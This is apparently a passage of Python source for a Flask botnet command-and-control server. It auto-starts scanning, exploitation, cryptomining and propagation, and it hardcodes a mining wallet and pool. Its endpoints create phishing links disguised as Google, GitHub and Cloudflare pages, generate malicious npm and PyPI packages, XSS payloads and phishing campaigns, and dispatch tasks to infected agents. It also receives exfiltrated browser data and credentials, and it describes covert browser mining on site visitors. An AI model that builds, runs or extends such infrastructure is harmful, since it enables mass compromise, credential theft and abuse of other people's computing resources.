╔══════════════════════════════════════════╗
║           C2 COMMAND & CONTROL           ║
──────────────────────────────────────────║
║  Host:  {args.host:<33}║
║  Port:  {args.port:<33}║
║  SSL:   {'ON' if ssl_ctx else 'OFF':<33}║
║  Login: admin / admin                    ║
╚══════════════════════════════════════════╝
""")
    log_event("server_start", f"{args.host}:{args.port}")
    
    # Auto-initialize demo data and agents on startup
    try:
        db = get_db()
        agent_count = db.execute("SELECT COUNT(*) as cnt FROM agents").fetchone()["cnt"]
        if agent_count == 0:
            print("[*] No agents found, seeding demo data...")
            seed_demo_data()
            print(f"[*] Demo data seeded: 7 agents created")
        else:
            # Ensure all existing agents are marked ONLINE
            db.execute("UPDATE agents SET is_alive=1, last_seen=datetime('now')")
            db.commit()
            print(f"[*] {agent_count} agents marked ONLINE")
        
        # Auto-start operations on server startup
        print("[*] Auto-starting operations...")
        with app.test_client() as client:
            # Start scan
            try:
                client.post('/api/exploitation/scan')
                print("[*] ✓ Scan started")
            except: pass
            # Start exploit
            try:
                client.post('/api/exploitation/exploit')
                print("[*] ✓ Exploit started")
            except: pass
            # Start mining
            try:
                client.post('/api/mining/start-all')
                print("[*] ✓ Mining started")
            except: pass
            # Start propagation
            try:
                client.post('/api/propagation/start')
                print("[*] ✓ Propagation started")
            except: pass
        print("[*] ✓ All operations auto-started")
    except Exception as e:
        print(f"[!] Auto-init error: {e}")
    
    # Start Telegram poller if configured
    global TELEGRAM_POLLER
    if TelegramPoller:
        tg_token = get_config("telegram_bot_token", "")
        if tg_token:
            print("[*] Starting Telegram poller...")
            TELEGRAM_POLLER = TelegramPoller(tg_token, app)
            TELEGRAM_POLLER.start()
    
    _suppress_connection_errors()
    
    try:
        socketio.run(app, host=args.host, port=args.port, debug=args.debug, use_reloader=False, allow_unsafe_werkzeug=True)
    except KeyboardInterrupt:
        print("\n[*] Server stopped")
    except Exception as e:
        print(f"[!] Server error: {e}")
        import traceback
        traceback.print_exc()


if __name__ == "__main__":
    main()


@app.route("/api/kaggle/auto-start-kernels", methods=["POST"])
@login_required
def kaggle_auto_start_kernels():
    """Auto-start all kernels for account via Selenium."""
    data = request.get_json(silent=True) or {}
    reg_id = data.get("reg_id")
    
    if not reg_id:
        return jsonify({"error": "reg_id required"}), 400
    
    # Get account
    acc = account_store.find(reg_id)
    if not acc:
        return jsonify({"error": "account not found"}), 404
    
    username = acc.get("kaggle_username")
    email = acc.get("email")
    password = acc.get("password")
    
    if not all([username, email, password]):
        return jsonify({"error": "missing credentials"}), 400
    
    # Import auto-start function
    import sys
    kaggle_path = BASE_DIR / "src" / "agents" / "kaggle"
    if str(kaggle_path) not in sys.path:
        sys.path.insert(0, str(kaggle_path))
    try:
        from auto_start_kernels import start_kernels_auto
    except ImportError:
        return jsonify({"error": "auto_start_kernels module not found"}), 500
    
    # Start in background thread
    def do_start():
        result = start_kernels_auto(username, email, password, lambda msg: log_event("auto_start", msg))
        log_event("auto_start_complete", f"{username}: {result.get('started', 0)}/{result.get('total', 0)}")
    
    threading.Thread(target=do_start, daemon=True).start()
    
    return jsonify({"status": "started", "message": "Auto-start initiated in background"})

# ──────────────────────── LINK MASKING SYSTEM ────────────────────────

@app.route("/links")
def links_page():
    """Link shortener management page."""
    return render_template("links.html")

@app.route("/go/<code>")
def masked_redirect(code):
    """Handle masked link redirects with tracking - instant redirect."""
    import json
    from pathlib import Path
    
    links_file = Path(__file__).parent.parent.parent / "data" / "masked_links.json"
    
    if not links_file.exists():
        return redirect("https://gbctwoserver.net")
    
    try:
        links = json.loads(links_file.read_text())
    except:
        return redirect("https://gbctwoserver.net")
    
    if code not in links:
        return redirect("https://gbctwoserver.net")
    
    link = links[code]
    
    # Track click
    link["clicks"] = link.get("clicks", 0) + 1
    link["last_click"] = datetime.now().isoformat()
    links_file.write_text(json.dumps(links, indent=2))
    
    # Log the click
    log_event("link_click", f"{code} -> {link['target_url']} from {request.remote_addr}")
    
    # Instant redirect to target
    return redirect(link["target_url"])

@app.route("/api/links")
def api_list_links():
    """API endpoint to list all masked links."""
    import json
    from pathlib import Path
    
    links_file = Path(__file__).parent.parent.parent / "data" / "masked_links.json"
    
    if not links_file.exists():
        return jsonify({})
    
    try:
        links = json.loads(links_file.read_text())
        return jsonify(links)
    except:
        return jsonify({})

@app.route("/api/links/create", methods=["POST"])
def api_create_link():
    """API endpoint to create masked link."""
    import json
    import random
    import string
    from pathlib import Path
    
    data = request.get_json() or {}
    target_url = data.get("target_url")
    mask_type = data.get("mask_type", "cloudflare")
    custom_text = data.get("display_text")
    
    if not target_url:
        return jsonify({"error": "target_url required"}), 400
    
    # Mask patterns
    masks = {
        "cloudflare": {"domain": "dash.cloudflare.com", "path": "/security/waf", "text": "Cloudflare Dashboard"},
        "google": {"domain": "accounts.google.com", "path": "/signin", "text": "Google Account"},
        "github": {"domain": "github.com", "path": "/settings/security", "text": "GitHub Settings"},
    }
    
    mask = masks.get(mask_type, masks["cloudflare"])
    
    # Generate code
    code = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
    
    links_file = Path(__file__).parent.parent.parent / "data" / "masked_links.json"
    links_file.parent.mkdir(parents=True, exist_ok=True)
    
    try:
        links = json.loads(links_file.read_text()) if links_file.exists() else {}
    except:
        links = {}
    
    links[code] = {
        "target_url": target_url,
        "display_url": f"https://{mask['domain']}{mask['path']}",
        "display_text": custom_text or mask["text"],
        "mask_type": mask_type,
        "created_at": datetime.now().isoformat(),
        "clicks": 0,
    }
    
    links_file.write_text(json.dumps(links, indent=2))
    
    return jsonify({
        "code": code,
        "short_url": f"https://gbctwoserver.net/go/{code}",
        "display_url": links[code]["display_url"],
        "target_url": target_url,
    })


# ──────────────────────── MINING PLATFORMS API ────────────────────────

@app.route("/api/mining/platforms")
@login_required
def mining_platforms():
    """Get all available mining platforms with details."""
    from src.agents.cloud.paperspace import PaperspaceMiner
    from src.agents.cloud.modal import ModalMiner
    from src.agents.cloud.mybinder import MyBinderMiner, AzureStudentMiner
    from src.agents.cloud.browser_mining import BrowserMiner
    
    platforms = {
        "cloud_gpu": [
            {
                "id": "paperspace",
                "name": "Paperspace Gradient",
                "url": "https://console.paperspace.com/signup",
                "icon": "🖥️",
                "gpu": True,
                "free": True,
                "phone_required": False,
                "description": "FREE GPU (M4000), email only registration",
                "instructions": [
                    "1. Sign up with email (no phone)",
                    "2. Create Gradient project",
                    "3. Create notebook with FREE GPU",
                    "4. Upload mining notebook",
                    "5. Run mining cells"
                ]
            },
            {
                "id": "modal",
                "name": "Modal",
                "url": "https://modal.com",
                "icon": "⚡",
                "gpu": True,
                "free_credits": "$30/month",
                "phone_required": False,
                "description": "$30/month FREE credits, GPU (A10G/A100)",
                "instructions": [
                    "1. Sign up with GitHub",
                    "2. Get $30/month automatically",
                    "3. pip install modal",
                    "4. modal token new",
                    "5. Deploy mining script"
                ]
            },
            {
                "id": "kaggle",
                "name": "Kaggle",
                "url": "https://www.kaggle.com",
                "icon": "🏆",
                "gpu": True,
                "free": True,
                "phone_required": False,
                "description": "FREE GPU (T4/P100), 30h/week",
                "instructions": [
                    "1. Register via Auto-Reg",
                    "2. Create notebook",
                    "3. Enable GPU accelerator",
                    "4. Run mining code"
                ]
            }
        ],
        "no_auth": [
            {
                "id": "mybinder",
                "name": "MyBinder",
                "url": "https://mybinder.org",
                "icon": "📓",
                "gpu": False,
                "free": True,
                "phone_required": False,
                "registration": False,
                "description": "Free Jupyter, NO registration, CPU only, 12h limit",
                "instructions": [
                    "1. Create GitHub repo with notebook",
                    "2. Go to mybinder.org",
                    "3. Enter repo URL",
                    "4. Launch (no login!)",
                    "5. Run mining cells"
                ]
            }
        ],
        "student": [
            {
                "id": "azure_student",
                "name": "Azure for Students",
                "url": "https://azure.microsoft.com/free/students",
                "icon": "🎓",
                "gpu": True,
                "free_credits": "$100",
                "phone_required": False,
                "requires_edu": True,
                "description": "$100 credits, NO credit card, .edu email required",
                "instructions": [
                    "1. Get .edu email (use EDU temp mail)",
                    "2. Sign up with .edu",
                    "3. Verify student status",
                    "4. Get $100 credits",
                    "5. Create GPU VM"
                ]
            }
        ],
        "browser": [
            {
                "id": "coinimp",
                "name": "CoinIMP",
                "url": "https://www.coinimp.com",
                "icon": "🌐",
                "gpu": False,
                "free": True,
                "phone_required": False,
                "fee": "0%",
                "description": "Browser JavaScript mining, 0% fee",
                "instructions": [
                    "1. Embed JS in website",
                    "2. Visitors mine for you",
                    "3. Or run in own browser"
                ]
            }
        ]
    }
    
    return jsonify({
        "status": "ok",
        "platforms": platforms,
        "wallet": "44haKQM5F43d37q3k6mV45YbrL5g6wGHWNB5uyt2cDfTdR8d9FicJCbitjm1xeKZzEVULG7MqdVFWEa9wKXsNLTpFvzffR5",
        "pool": "pool.hashvault.pro:80"
    })


@app.route("/api/mining/deploy/<platform_id>", methods=["POST"])
@login_required
def mining_deploy(platform_id):
    """Generate deployment code for mining platform."""
    data = request.get_json(silent=True) or {}
    
    wallet = data.get("wallet", "44haKQM5F43d37q3k6mV45YbrL5g6wGHWNB5uyt2cDfTdR8d9FicJCbitjm1xeKZzEVULG7MqdVFWEa9wKXsNLTpFvzffR5")
    pool = data.get("pool", "pool.hashvault.pro:80")
    
    if platform_id == "mybinder":
        from src.agents.cloud.mybinder import MyBinderMiner
        notebook = MyBinderMiner.generate_notebook(wallet, pool)
        return jsonify({
            "status": "ok",
            "platform": "mybinder",
            "notebook": notebook,
            "instructions": MyBinderMiner.get_binder_url("USER", "REPO")
        })
    
    elif platform_id == "paperspace":
        from src.agents.cloud.paperspace import PaperspaceMiner
        notebook = PaperspaceMiner.generate_notebook(wallet, pool)
        return jsonify({
            "status": "ok",
            "platform": "paperspace",
            "notebook": notebook,
            "instructions": PaperspaceMiner.get_instructions()
        })
    
    elif platform_id == "modal":
        from src.agents.cloud.modal import ModalMiner
        script = ModalMiner.generate_script(wallet, pool)
        return jsonify({
            "status": "ok",
            "platform": "modal",
            "script": script,
            "instructions": ModalMiner.get_instructions()
        })
    
    elif platform_id == "browser":
        from src.agents.cloud.browser_mining import BrowserMiner
        html = BrowserMiner.generate_html(wallet)
        js = BrowserMiner.generate_injector(wallet)
        return jsonify({
            "status": "ok",
            "platform": "browser",
            "html_code": html,
            "injector_js": js
        })
    
    elif platform_id == "azure_student":
        from src.agents.cloud.mybinder import AzureStudentMiner
        return jsonify({
            "status": "ok",
            "platform": "azure_student",
            "deployment_script": AzureStudentMiner.generate_deployment_script(),
            "requires_edu": True
        })
    
    return jsonify({"error": f"Unknown platform: {platform_id}"}), 404


@app.route("/api/mining/notebook/<platform_id>")
@login_required
def mining_notebook(platform_id):
    """Download mining notebook for platform."""
    from src.agents.cloud.mybinder import MyBinderMiner
    from src.agents.cloud.paperspace import PaperspaceMiner
    import json
    
    notebook = None
    filename = f"{platform_id}_mining.ipynb"
    
    if platform_id == "mybinder":
        notebook = MyBinderMiner.generate_notebook()
    elif platform_id == "paperspace":
        notebook = PaperspaceMiner.generate_notebook()
    
    if notebook:
        response = app.response_class(
            response=json.dumps(notebook, indent=2),
            status=200,
            mimetype='application/json'
        )
        response.headers["Content-Disposition"] = f"attachment; filename={filename}"
        return response
    
    return jsonify({"error": "Notebook not available"}), 404


# ──────────────────────── API: GLOBAL AGENTS NETWORK ────────────────────────

@app.route("/api/global/stats")
@login_required
def global_agent_stats():
    """Get global agent network statistics."""
    db = get_db()
    
    # Total agents
    total_agents = db.execute("SELECT COUNT(*) FROM agents").fetchone()[0]
    
    # Agents by platform
    platforms = db.execute("""
        SELECT platform, COUNT(*) as count 
        FROM agents 
        GROUP BY platform
    """).fetchall()
    
    # Agents by status
    statuses = db.execute("""
        SELECT 
            CASE 
                WHEN last_seen > datetime('now', '-5 minutes') THEN 'online'
                WHEN last_seen > datetime('now', '-1 hour') THEN 'recent'
                ELSE 'offline'
            END as status,
            COUNT(*) as count
        FROM agents
        GROUP BY status
    """).fetchall()
    
    # Recent registrations (last 24h)
    recent = db.execute("""
        SELECT COUNT(*) FROM agents 
        WHERE created_at > datetime('now', '-24 hours')
    """).fetchone()[0]
    
    # Tasks statistics
    total_tasks = db.execute("SELECT COUNT(*) FROM tasks").fetchone()[0]
    pending_tasks = db.execute("SELECT COUNT(*) FROM tasks WHERE status = 'pending'").fetchone()[0]
    completed_tasks = db.execute("SELECT COUNT(*) FROM tasks WHERE status = 'completed'").fetchone()[0]
    
    return jsonify({
        "total_agents": total_agents,
        "platforms": {p["platform"]: p["count"] for p in platforms},
        "statuses": {s["status"]: s["count"] for s in statuses},
        "recent_24h": recent,
        "tasks": {
            "total": total_tasks,
            "pending": pending_tasks,
            "completed": completed_tasks
        },
        "target": "1B agents"
    })


@app.route("/api/global/agents")
def global_agents_list():
    """List all agents in the global network with filtering."""
    db = get_db()
    
    platform = request.args.get("platform", "")
    status = request.args.get("status", "")
    limit = min(int(request.args.get("limit", 100)), 1000)
    offset = int(request.args.get("offset", 0))
    
    query = "SELECT * FROM agents WHERE 1=1"
    params = []
    
    if platform:
        query += " AND platform = ?"
        params.append(platform)
    
    if status == "online":
        query += " AND last_seen > datetime('now', '-5 minutes')"
    elif status == "recent":
        query += " AND last_seen > datetime('now', '-1 hour')"
    
    query += " ORDER BY last_seen DESC LIMIT ? OFFSET ?"
    params.extend([limit, offset])
    
    agents = db.execute(query, params).fetchall()
    
    return jsonify({
        "agents": [dict(a) for a in agents],
        "count": len(agents)
    })


@app.route("/api/global/agents/<agent_id>")
@login_required
def global_agent_get(agent_id):
    """Get detailed information about a specific agent."""
    db = get_db()
    
    agent = db.execute("SELECT * FROM agents WHERE agent_id = ?", (agent_id,)).fetchone()
    if not agent:
        return jsonify({"error": "Agent not found"}), 404
    
    # Get recent tasks
    tasks = db.execute("""
        SELECT * FROM tasks 
        WHERE agent_id = ? 
        ORDER BY created_at DESC 
        LIMIT 20
    """, (agent_id,)).fetchall()
    
    # Get collected data (if any)
    data = db.execute("""
        SELECT * FROM agent_data 
        WHERE agent_id = ? 
        ORDER BY collected_at DESC 
        LIMIT 50
    """, (agent_id,)).fetchall()
    
    return jsonify({
        "agent": dict(agent),
        "tasks": [dict(t) for t in tasks],
        "data": [dict(d) for d in data]
    })


@app.route("/api/global/agents/<agent_id>/task", methods=["POST"])
def global_agent_task(agent_id):
    """Send a task to a specific agent."""
    try:
        db = get_db()
        
        data = request.get_json(silent=True) or {}
        task_type = data.get("task_type", "cmd")
        payload = data.get("payload", {})
        
        # Convert payload dict to JSON string if needed
        if isinstance(payload, dict):
            payload = json.dumps(payload)
        
        # Verify agent exists (search by id column)
        agent = db.execute("SELECT id FROM agents WHERE id = ?", (agent_id,)).fetchone()
        if not agent:
            return jsonify({"error": "Agent not found"}), 404
        
        # Create task
        result = db.execute("""
            INSERT INTO tasks (agent_id, task_type, payload, status, created_at)
            VALUES (?, ?, ?, 'pending', datetime('now'))
        """, (agent_id, task_type, payload))
        
        task_id = result.lastrowid
        db.commit()
        
        # Emit to connected clients
        socketio.emit("new_task", {"task_id": task_id, "agent_id": agent_id, "task_type": task_type})
        
        return jsonify({
            "status": "ok",
            "task_id": task_id,
            "agent_id": agent_id
        })
    except Exception as e:
        return jsonify({"status": "error", "error": str(e)}), 500


@app.route("/api/global/agents/task-all", methods=["POST"])
def global_agent_task_all():
    """Send task to all online agents."""
    try:
        db = get_db()
        
        data = request.get_json(silent=True) or {}
        task_type = data.get("task_type", "cmd")
        payload = data.get("payload", {})
        
        if isinstance(payload, dict):
            payload = json.dumps(payload)
        
        # Get all online agents
        agents = db.execute("""
            SELECT id FROM agents 
            WHERE is_alive = 1 OR last_seen > datetime('now', '-1 hour')
        """).fetchall()
        
        if not agents:
            return jsonify({"status": "error", "error": "No online agents"}), 400
        
        task_ids = []
        for agent in agents:
            result = db.execute("""
                INSERT INTO tasks (agent_id, task_type, payload, status, created_at)
                VALUES (?, ?, ?, 'pending', datetime('now'))
            """, (agent["id"], task_type, payload))
            task_ids.append(result.lastrowid)
        
        db.commit()
        
        # Notify
        socketio.emit("mass_task", {
            "task_type": task_type,
            "agents_count": len(agents),
            "task_ids": task_ids
        })
        
        return jsonify({
            "status": "ok",
            "agents_targeted": len(agents),
            "task_ids": task_ids
        })
    except Exception as e:
        return jsonify({"status": "error", "error": str(e)}), 500


@app.route("/api/global/agents/<agent_id>/data", methods=["GET"])
@login_required
def global_agent_data(agent_id):
    """Get collected data from a specific agent."""
    db = get_db()
    
    data_type = request.args.get("type", "")
    limit = min(int(request.args.get("limit", 100)), 1000)
    
    query = "SELECT * FROM agent_data WHERE agent_id = ?"
    params = [agent_id]
    
    if data_type:
        query += " AND data_type = ?"
        params.append(data_type)
    
    query += " ORDER BY collected_at DESC LIMIT ?"
    params.append(limit)
    
    data = db.execute(query, params).fetchall()
    
    return jsonify({
        "agent_id": agent_id,
        "data": [dict(d) for d in data],
        "count": len(data)
    })


@app.route("/api/global/broadcast", methods=["POST"])
@login_required
def global_broadcast_task():
    """Broadcast a task to all agents matching criteria."""
    db = get_db()
    
    data = request.get_json(silent=True) or {}
    task_type = data.get("task_type", "cmd")
    payload = data.get("payload", "")
    platform = data.get("platform", "")
    limit = data.get("limit", 1000)
    
    # Build query for target agents
    query = "SELECT id FROM agents WHERE last_seen > datetime('now', '-1 hour')"
    params = []
    
    if platform:
        query += " AND platform_type = ?"
        params.append(platform)
    
    query += f" LIMIT {limit}"
    
    agents = db.execute(query, params).fetchall()
    
    # Create tasks for all matching agents
    task_ids = []
    for agent in agents:
        result = db.execute("""
            INSERT INTO tasks (agent_id, task_type, payload, status, created_at)
            VALUES (?, ?, ?, 'pending', datetime('now'))
        """, (agent["id"], task_type, payload))
        task_ids.append(result.lastrowid)
    
    db.commit()
    
    # Emit broadcast event
    socketio.emit("broadcast_task", {
        "task_type": task_type,
        "target_count": len(task_ids),
        "platform": platform
    })
    
    return jsonify({
        "status": "ok",
        "tasks_created": len(task_ids),
        "task_ids": task_ids[:100]  # Return first 100 IDs
    })


@app.route("/api/global/regions")
@login_required
def global_regions():
    """Get regional C2 statistics."""
    # This would connect to regional C2 servers
    # For now, return placeholder
    return jsonify({
        "regions": [
            {"name": "Americas", "agents": 0, "c2_servers": 10},
            {"name": "Europe", "agents": 0, "c2_servers": 10},
            {"name": "Asia", "agents": 0, "c2_servers": 10},
            {"name": "Africa", "agents": 0, "c2_servers": 5},
            {"name": "Oceania", "agents": 0, "c2_servers": 5}
        ],
        "total_c2_servers": 40,
        "master_c2": "hidden"
    })


@app.route("/api/global/sectors")
@login_required
def global_sectors():
    """Get sector C2 statistics."""
    return jsonify({
        "sectors": [
            {"name": "Technology", "agents": 0, "companies": 0},
            {"name": "Finance", "agents": 0, "companies": 0},
            {"name": "Healthcare", "agents": 0, "companies": 0},
            {"name": "Government", "agents": 0, "agencies": 0},
            {"name": "Education", "agents": 0, "universities": 0},
            {"name": "Energy", "agents": 0, "companies": 0},
            {"name": "Telecom", "agents": 0, "companies": 0}
        ]
    })


@app.route("/api/global/propagate", methods=["POST"])
def global_propagate():
    """Trigger propagation on all online agents."""
    db = get_db()
    
    data = request.get_json(silent=True) or {}
    method = data.get("method", "all")  # all, network, ssh, web, usb, bluetooth
    target_agents = data.get("agents", [])  # Specific agents or empty for all
    
    # Get online agents
    if target_agents:
        agents = [{"id": a} for a in target_agents]
    else:
        agents = db.execute("""
            SELECT id FROM agents 
            WHERE last_seen > datetime('now', '-5 minutes')
            AND platform_type IN ('linux', 'windows', 'macos', 'machine', 'cloud', 'vm')
        """).fetchall()
    
    # Create propagation tasks
    task_ids = []
    for agent in agents:
        payload = json.dumps({"method": method})
        result = db.execute("""
            INSERT INTO tasks (agent_id, task_type, payload, status, created_at)
            VALUES (?, 'propagate', ?, 'pending', datetime('now'))
        """, (agent["id"], payload))
        task_ids.append(result.lastrowid)
    
    db.commit()
    
    # Emit propagation event
    socketio.emit("propagation_result", {
        "success": len(task_ids),
        "failed": 0,
        "method": method,
        "triggered_by": session.get("user", "unknown")
    })
    
    return jsonify({
        "status": "ok",
        "method": method,
        "agents_targeted": len(task_ids),
        "task_ids": task_ids[:100]
    })


@app.route("/api/global/collect", methods=["POST"])
def global_collect():
    """Trigger data collection on all online agents."""
    db = get_db()
    
    data = request.get_json(silent=True) or {}
    collect_type = data.get("type", "all")  # all, credentials, browser, files, system
    
    # Get online agents
    agents = db.execute("""
        SELECT id FROM agents 
        WHERE last_seen > datetime('now', '-5 minutes')
    """).fetchall()
    
    # Create collection tasks
    task_ids = []
    for agent in agents:
        payload = json.dumps({"collect_type": collect_type})
        result = db.execute("""
            INSERT INTO tasks (agent_id, task_type, payload, status, created_at)
            VALUES (?, 'collect', ?, 'pending', datetime('now'))
        """, (agent["id"], payload))
        task_ids.append(result.lastrowid)
    
    db.commit()
    
    # Emit data collection event
    socketio.emit("data_collected", {
        "records": len(task_ids),
        "collect_type": collect_type,
        "agents_targeted": len(task_ids),
        "triggered_by": session.get("user", "unknown")
    })
    
    return jsonify({
        "status": "ok",
        "collect_type": collect_type,
        "agents_targeted": len(task_ids),
        "task_ids": task_ids[:100]
    })


@app.route("/api/global/supply-chain/npm")
@login_required
def supply_chain_npm():
    """Generate malicious NPM package for supply chain attack."""
    from src.agents.universal import propagate_supply_chain_npm
    
    package_name = request.args.get("name", f"util-{uuid.uuid4().hex[:8]}")
    package = propagate_supply_chain_npm(package_name)
    
    return jsonify({
        "status": "ok",
        "package": package,
        "distribution": "npm publish",
        "potential_reach": "100K+ downloads"
    })


@app.route("/api/global/supply-chain/pypi")
@login_required
def supply_chain_pypi():
    """Generate malicious PyPI package for supply chain attack."""
    from src.agents.universal import propagate_supply_chain_pypi
    
    package_name = request.args.get("name", f"util-{uuid.uuid4().hex[:8]}")
    package = propagate_supply_chain_pypi(package_name)
    
    return jsonify({
        "status": "ok",
        "package": package,
        "distribution": "twine upload",
        "potential_reach": "100K+ downloads"
    })


@app.route("/api/global/xss")
@login_required
def global_xss_payloads():
    """Generate XSS payloads for browser agent injection."""
    from src.agents.universal import propagate_xss_payload
    
    target = request.args.get("target", "")
    callback = request.args.get("callback", "")
    
    payloads = propagate_xss_payload(target, callback)
    
    return jsonify({
        "status": "ok",
        "payloads": payloads,
        "usage": "Inject into vulnerable web applications"
    })


@app.route("/api/global/phishing")
@login_required
def global_phishing():
    """Generate phishing campaign materials."""
    from src.agents.universal import propagate_email_phishing
    
    template = request.args.get("template", "update")
    targets = request.args.getlist("targets")
    
    campaign = propagate_email_phishing(targets, template)
    
    return jsonify({
        "status": "ok",
        "campaign": campaign,
        "success_rate": "~1-5%"
    })


@app.route("/api/global/agent-types")
@login_required
def global_agent_types():
    """Get all supported agent types."""
    return jsonify({
        "types": {
            "browser": {
                "platform": "javascript",
                "distribution": ["extension", "xss", "pwa", "service_worker"],
                "persistence": ["localStorage", "IndexedDB", "ServiceWorker"],
                "capabilities": ["cookies", "history", "forms", "fingerprint"]
            },
            "android": {
                "platform": "java/kotlin",
                "distribution": ["play_store", "apk", "system_app"],
                "persistence": ["system", "boot_receiver", "foreground_service"],
                "capabilities": ["location", "sms", "contacts", "camera", "mic", "files"]
            },
            "ios": {
                "platform": "swift",
                "distribution": ["app_store", "ipa", "enterprise"],
                "persistence": ["background_fetch", "silent_push"],
                "capabilities": ["location", "contacts", "photos", "keychain"]
            },
            "windows": {
                "platform": "python/exe",
                "distribution": ["installer", "update", "supply_chain"],
                "persistence": ["registry", "scheduled_task", "service"],
                "capabilities": ["full_access", "keylogger", "screen_capture"]
            },
            "linux": {
                "platform": "python/elf",
                "distribution": ["package", "script", "supply_chain"],
                "persistence": ["cron", "systemd", "rc.local"],
                "capabilities": ["full_access", "rootkit"]
            },
            "macos": {
                "platform": "python/app",
                "distribution": ["dmg", "brew", "supply_chain"],
                "persistence": ["launch_agent", "launch_daemon"],
                "capabilities": ["full_access", "keychain_access"]
            },
            "server_web": {
                "platform": "php/asp/jsp",
                "distribution": ["exploit", "backdoor", "supply_chain"],
                "persistence": ["webshell", "cron", "systemd"],
                "capabilities": ["database", "files", "credentials"]
            },
            "server_cloud": {
                "platform": "python/node",
                "distribution": ["function", "container", "lambda"],
                "persistence": ["scheduled_trigger", "event_trigger"],
                "capabilities": ["cloud_api", "metadata", "credentials"]
            },
            "router": {
                "platform": "embedded",
                "distribution": ["exploit", "firmware_backdoor"],
                "persistence": ["firmware", "nvram"],
                "capabilities": ["traffic_intercept", "dns_hijack", "mitm"]
            },
            "iot": {
                "platform": "embedded",
                "distribution": ["exploit", "default_creds"],
                "persistence": ["firmware", "sd_card"],
                "capabilities": ["sensors", "camera", "mic", "physical_access"]
            }
        }
    })


# ──────────────────────── API: BROWSER AGENT ────────────────────────

@app.route("/api/agent/browser/register", methods=["POST"])
def browser_agent_register():
    """Register a browser agent."""
    db = get_db()
    
    agent_id = request.headers.get("X-Agent-Id") or str(uuid.uuid4())
    data = request.get_json(silent=True) or {}
    
    # Extract browser fingerprint
    fingerprint = data.get("fingerprint", {})
    url = data.get("url", "")
    
    # Check if agent exists
    existing = db.execute("SELECT id FROM agents WHERE agent_id = ?", (agent_id,)).fetchone()
    
    if existing:
        # Update last seen
        db.execute("""
            UPDATE agents SET last_seen = datetime('now'), 
            ip_address = ?, metadata = ?
            WHERE agent_id = ?
        """, (request.remote_addr, json.dumps(data), agent_id))
    else:
        # Create new agent
        db.execute("""
            INSERT INTO agents (agent_id, platform, hostname, ip_address, metadata, created_at, last_seen)
            VALUES (?, 'browser', ?, ?, ?, datetime('now'), datetime('now'))
        """, (agent_id, fingerprint.get("platform", "unknown"), request.remote_addr, json.dumps(data)))
    
    db.commit()
    
    return jsonify({
        "status": "ok",
        "agent_id": agent_id,
        "message": "Browser agent registered"
    })


@app.route("/api/agent/browser/beacon", methods=["POST", "GET"])
def browser_agent_beacon():
    """Receive beacon from browser agent."""
    db = get_db()
    
    agent_id = request.headers.get("X-Agent-Id") or request.args.get("agent_id")
    
    if not agent_id:
        return jsonify({"error": "Missing agent ID"}), 400
    
    # Update last seen
    db.execute("""
        UPDATE agents SET last_seen = datetime('now')
        WHERE agent_id = ?
    """, (agent_id,))
    
    # Store beacon data if provided
    if request.method == "POST":
        try:
            data = request.get_json(silent=True) or {}
            if not data:
                # Try to decode from body
                body = request.data.decode()
                data = json.loads(body) if body else {}
            
            # Store in agent_data table
            db.execute("""
                INSERT INTO agent_data (agent_id, data_type, data, collected_at)
                VALUES (?, 'beacon', ?, datetime('now'))
            """, (agent_id, json.dumps(data)[:10000]))  # Limit data size
        except Exception as e:
            log_event(f"Browser beacon parse error: {e}")
    
    db.commit()
    
    # Return any pending tasks
    tasks = db.execute("""
        SELECT id, task_type, payload FROM tasks 
        WHERE agent_id = ? AND status = 'pending'
        ORDER BY created_at ASC LIMIT 10
    """, (agent_id,)).fetchall()
    
    return jsonify({
        "status": "ok",
        "tasks": [{"id": t["id"], "type": t["task_type"], "payload": t["payload"]} for t in tasks]
    })


@app.route("/api/agent/browser/tasks", methods=["GET"])
def browser_agent_tasks():
    """Get pending tasks for browser agent."""
    db = get_db()
    
    agent_id = request.headers.get("X-Agent-Id")
    if not agent_id:
        return jsonify({"error": "Missing agent ID"}), 400
    
    tasks = db.execute("""
        SELECT id, task_type, payload FROM tasks 
        WHERE agent_id = ? AND status = 'pending'
        ORDER BY created_at ASC LIMIT 20
    """, (agent_id,)).fetchall()
    
    return jsonify({
        "tasks": [{"id": t["id"], "type": t["task_type"], "payload": t["payload"]} for t in tasks]
    })


@app.route("/api/agent/browser/result", methods=["POST"])
def browser_agent_result():
    """Receive task result from browser agent."""
    db = get_db()
    
    agent_id = request.headers.get("X-Agent-Id")
    data = request.get_json(silent=True) or {}
    
    task_id = data.get("taskId")
    status = data.get("status", "completed")
    result = data.get("result")
    
    if not task_id:
        return jsonify({"error": "Missing task ID"}), 400
    
    # Update task
    db.execute("""
        UPDATE tasks SET status = ?, result = ?, completed_at = datetime('now')
        WHERE id = ? AND agent_id = ?
    """, (status, json.dumps(result)[:10000] if result else None, task_id, agent_id))
    
    db.commit()
    
    # Emit result event
    socketio.emit("task_result", {
        "task_id": task_id,
        "agent_id": agent_id,
        "status": status
    })
    
    return jsonify({"status": "ok"})


@app.route("/api/agent/browser/exfil", methods=["POST"])
def browser_agent_exfil():
    """Receive exfiltrated data from browser agent."""
    db = get_db()
    
    agent_id = request.headers.get("X-Agent-Id")
    data = request.get_json(silent=True) or {}
    
    # Store exfiltrated data
    db.execute("""
        INSERT INTO agent_data (agent_id, data_type, data, collected_at)
        VALUES (?, 'exfil', ?, datetime('now'))
    """, (agent_id, json.dumps(data)[:50000]))  # Larger limit for exfil
    
    db.commit()
    
    return jsonify({"status": "ok", "stored": True})


@app.route("/api/agent/browser/data", methods=["GET"])
@login_required
def browser_agent_data_list():
    """Get collected data from browser agents."""
    db = get_db()
    
    agent_id = request.args.get("agent_id", "")
    data_type = request.args.get("type", "")
    limit = min(int(request.args.get("limit", 100)), 1000)
    
    query = "SELECT * FROM agent_data WHERE 1=1"
    params = []
    
    if agent_id:
        query += " AND agent_id = ?"
        params.append(agent_id)
    
    if data_type:
        query += " AND data_type = ?"
        params.append(data_type)
    
    query += " ORDER BY collected_at DESC LIMIT ?"
    params.append(limit)
    
    data = db.execute(query, params).fetchall()
    
    return jsonify({
        "data": [dict(d) for d in data],
        "count": len(data)
    })


@app.route("/api/agent/browser/credentials", methods=["GET"])
@login_required
def browser_agent_credentials():
    """Get collected credentials from browser agents."""
    db = get_db()
    
    # Search for credential-related data
    credentials = db.execute("""
        SELECT agent_id, data, collected_at 
        FROM agent_data 
        WHERE data_type = 'exfil' 
        AND data LIKE '%credential%'
        ORDER BY collected_at DESC 
        LIMIT 100
    """).fetchall()
    
    parsed_creds = []
    for cred in credentials:
        try:
            data = json.loads(cred["data"])
